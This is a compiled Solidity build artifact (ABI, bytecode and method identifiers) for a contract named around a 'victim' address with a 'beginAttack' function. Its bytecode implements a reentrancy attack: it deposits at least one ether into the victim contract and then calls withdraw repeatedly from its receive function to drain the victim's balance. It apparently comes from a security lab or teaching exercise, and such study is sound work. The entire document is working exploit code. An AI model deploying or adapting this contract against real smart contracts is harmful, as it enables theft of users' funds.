{"abi":[{"type":"constructor","inputs":[{"name":"_victim_address","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"beginAttack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"victim","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Victim"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b506040516104a13803806104a1833981810160405281019061003191906100d4565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f5ffd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6103958061010c5f395ff3fe608060405260043610610037575f3560e01c806312065fe014610104578063930c20031461012e578063d1d0fd771461015857610100565b3661010057670de0b6b3a76400005f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106100fe575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156100e7575f5ffd5b505af11580156100f9573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b34801561010f575f5ffd5b50610118610162565b60405161012591906102b3565b60405180910390f35b348015610139575f5ffd5b50610142610169565b60405161014f9190610346565b60405180910390f35b61016061018d565b005b5f47905090565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a76400003410156101a1575f5ffd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b158015610207575f5ffd5b505af1158015610219573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610283575f5ffd5b505af1158015610295573d5f5f3e3d5ffd5b50505050565b5f819050919050565b6102ad8161029b565b82525050565b5f6020820190506102c65f8301846102a4565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61030e610309610304846102cc565b6102eb565b6102cc565b9050919050565b5f61031f826102f4565b9050919050565b5f61033082610315565b9050919050565b61034081610326565b82525050565b5f6020820190506103595f830184610337565b9291505056fea264697066735822122083e10269e1d1ceb38bddc0437176f6967ce68b4c1afd88fb112a06bca409c1f664736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"beginAttack()":"d1d0fd77","getBalance()":"12065fe0","victim()":"930c2003"},"id":22}